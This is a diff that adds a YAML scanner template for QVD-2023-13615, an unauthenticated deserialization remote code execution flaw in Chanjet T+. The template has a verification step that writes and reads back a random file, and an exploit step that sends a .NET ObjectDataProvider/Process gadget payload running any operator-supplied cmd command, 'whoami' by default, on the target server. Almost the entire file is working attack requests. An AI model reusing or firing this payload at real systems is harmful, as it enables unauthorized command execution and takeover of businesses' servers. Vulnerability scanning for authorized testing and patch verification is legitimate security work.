@@ -1,0 +1,96 @@
+app: 畅捷通
+query: app:"畅捷通"
+meta:
+    name: QVD-2023-13615畅捷通T 远程代码执行漏洞
+    level: 5
+    tags:
+        - remote_code_execution
+    description: 畅捷通 T+前台存在不安全的反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的请求在目标服务器上执行任意命令。
+    homepage: https://www.chanjet.com/
+    author: Administrator
+    references: https://its.stiei.edu.cn/2023/0613/c4929a102367/page.htm
+    solution: 目前官方已发布补丁更新，建议受影响用户尽快安装
+    create_at: "2023-09-13 11:03:33"
+    available: true
+    steps:
+        variable:
+            - r1: randomLowercase(10)
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: POST
+                    path: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore
+                    redirect: true
+                    header:
+                        - Content-type: application/x-www-form-urlencoded
+                    params: |4-
+                         {
+                                                                        		"storeID": {
+                                                                        			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+                                                                        			"MethodName": "Start",
+                                                                        			"ObjectInstance": {
+                                                                        				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                                                                        				"StartInfo": {
+                                                                        					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                                                                        					"FileName": "cmd",
+                                                                        					"Arguments": "/c  echo {{r1}} >{{r1}}.txt"
+                                                                        				}
+                                                                        			}
+                                                                        		}
+                                                                        	}
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: Exception
+                      type: contains
+                - request:
+                    method: GET
+                    path: /tplus/{{r1}}.txt
+                    redirect: true
+                    header: []
+                    params: ""
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: '{{r1}}'
+                      type: contains
+        exploit_steps:
+            type: and
+            params:
+                name: CMD
+                type: input
+                value: whoami
+            exploit:
+                - request:
+                    method: POST
+                    path: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore
+                    redirect: true
+                    header:
+                        - Content-type: application/x-www-form-urlencoded
+                    params: |4-
+                         {
+                                                                        		"storeID": {
+                                                                        			"__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+                                                                        			"MethodName": "Start",
+                                                                        			"ObjectInstance": {
+                                                                        				"__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                                                                        				"StartInfo": {
+                                                                        					"__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                                                                        					"FileName": "cmd",
+                                                                        					"Arguments": "/c  {{exploit}}"
+                                                                        				}
+                                                                        			}
+                                                                        		}
+                                                                        	}
+                  response:
+                    - name: body
+                      value: Exception
+                      type: contains
+                    - name: code
+                      value: "200"
+                      type: equals
